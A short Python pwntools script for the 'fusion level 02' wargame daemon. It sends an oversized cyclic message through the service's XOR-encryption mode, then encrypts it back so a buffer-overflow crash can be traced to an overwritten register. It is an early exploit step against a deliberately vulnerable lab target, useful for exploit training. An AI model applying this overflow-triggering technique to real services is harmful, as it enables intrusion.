#!/usr/bin/python
'''
Simple script to interact with fusion level 02 challenge network daemon,
#!/usr/bin/python
mkocbayi@gmail.com
'''
from pwn import *
import sys
#Use this hexdump lib because pwntools hexdump is too slow
from hexdump import *

def doMode(mode): # Either E or Q
    print 'Sending mode call: {}'.format(mode)
    #Specify encryption function
    io.send(mode)
    
def doEncryption(message, fake_message_size=None):
    doMode('E')
    if fake_message_size is not None:
        message_size = fake_message_size
    else:
        message_size = len(message)
    #Specify message size as little endian 8(d) = \x08\x00\x00\x00
    encryption_size_bytes = p32(message_size) #Use p32, p64, or pack
    print 'Sending message size as bytes\n{}'.format(encryption_size_bytes.encode('hex'))
    print 'Sending message size as bytes\n{}'.format(unpack(encryption_size_bytes))
    #Specify size of message to be encrypted
    io.send(encryption_size_bytes)
    #Generate message and send
    print 'Sending message\n{}'.format(hexdump(message))
    io.send(message)
    data = io.recvregex('your file --]\n')
    log.info(data)
    #Server sends message size as 4 bytes little endian
    data = io.recvn(4)
    log.info('Received encrypted message size as bytes\n{}'.format(data.encode('hex')))
    log.info('Size in integer\n{}'.format(unpack(data)))
    encrypted_message = io.recvn(message_size)
    log.info('Received encrypted message\n{}'.format(hexdump(encrypted_message)))
    return encrypted_message
    
if __name__ == "__main__":
    host = sys.argv[1]
    port = sys.argv[2]
    io = remote(host,int(port))
    #size = 32*4096 # No crash
    # xor key is 32*4 = 128 bytes
    message_size = 32*4096+16 # crash
    message = cyclic(message_size) #Generate unique string to help determin payload register overwrite
    xor_message = doEncryption(message)
    message = doEncryption(xor_message)
    doMode('Q')
